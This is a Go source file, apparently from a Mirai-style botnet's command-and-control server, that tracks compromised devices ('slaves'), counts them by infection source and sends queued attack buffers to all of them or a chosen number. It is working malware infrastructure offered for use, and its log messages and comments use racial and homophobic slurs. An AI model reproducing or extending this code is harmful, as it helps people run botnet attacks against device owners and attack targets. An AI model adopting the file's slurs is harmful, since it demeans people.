package slaves

import (
	"fmt"
	"regexp"
	"strings"
	"sync"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

var Fake = false

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	cntMutex    *sync.Mutex
}

func NewClientList() {
	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
	go c.worker()
	go c.fastCountWorker()
	CL = c
}

func (cl *ClientList) Count() int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.cntView <- 0

	return <-cl.cntView
}

func (cl *ClientList) Distribution() map[string]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.distViewReq <- 0
	return <-cl.distViewRes
}

func (cl *ClientList) AddClient(c *Bot) {
	cl.addQueue <- c
	if c.source == "" {
		c.source = "unknown"
	}
	if strings.Contains(c.source, "\r") || strings.Contains(c.source, "\n") {
		/* Remove \r and \n */
		c.source = strings.ReplaceAll(c.source, "\r", "") /* fixes some gay shit that shouldn't exist in the first place */
		c.source = strings.ReplaceAll(c.source, "\n", "") /* fixes some gay shit that shouldn't exist in the first place v2 */
		c.source = strings.ReplaceAll(c.source, "\t", "") /* fixes some gay shit that shouldn't exist in the first place v3 */
	}
	re := regexp.MustCompile(`^mass\.(.*)$`)       /* remove "mass.*" */
	c.source = re.ReplaceAllString(c.source, "$1") /* just the part after mass. */
	fmt.Printf("\x1b[92mAdded Nigger \u001B[97m%d, %s, %s\u001B[0m\n", c.version, c.source, c.conn.RemoteAddr())
}

func (cl *ClientList) DelClient(c *Bot) {
	cl.delQueue <- c
	if c.source == "" {
		c.source = "unknown"
	}
	if len(c.source) >= 20 { /* source name is too long, we make it 20 chars */
		c.source = c.source[:20]
	}
	if strings.Contains(c.source, "\r") || strings.Contains(c.source, "\n") {
		/* Remove \r and \n */
		c.source = strings.ReplaceAll(c.source, "\r", "") /* fixes some gay shit that shouldn't exist in the first place */
		c.source = strings.ReplaceAll(c.source, "\n", "") /* fixes some gay shit that shouldn't exist in the first place v2 */
		c.source = strings.ReplaceAll(c.source, "\t", "") /* fixes some gay shit that shouldn't exist in the first place v3 */
	}
	re := regexp.MustCompile(`^mass\.(.*)$`) /* remove "mass.*" */
	c.source = re.ReplaceAllString(c.source, "$1")
	fmt.Printf("\u001B[91mTerminated Nigger \u001B[97m%d - %s - %s\u001B[0m\n", c.version, c.source, c.conn.RemoteAddr())
}

func (cl *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	cl.atkQueue <- attack
}

func (cl *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-cl.totalCount:
			cl.count += delta
			break
		case <-cl.cntView:
			cl.cntView <- cl.count
			break
		}
	}
}

func (cl *ClientList) worker() {
	for {
		select {
		case add := <-cl.addQueue:
			cl.totalCount <- 1
			cl.uid++
			add.uid = cl.uid
			cl.clients[add.uid] = add
			break
		case del := <-cl.delQueue:
			cl.totalCount <- -1
			delete(cl.clients, del.uid)
			break
		case atk := <-cl.atkQueue:
			if atk.count == -1 {
				for _, v := range cl.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				var count int
				for _, v := range cl.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
			break
		case <-cl.cntView:
			cl.cntView <- cl.count
			break
		case <-cl.distViewReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				if ok, _ := res[v.source]; ok > 0 {
					res[v.source]++
				} else {
					res[v.source] = 1
				}
			}
			cl.distViewRes <- res
		}
	}
}
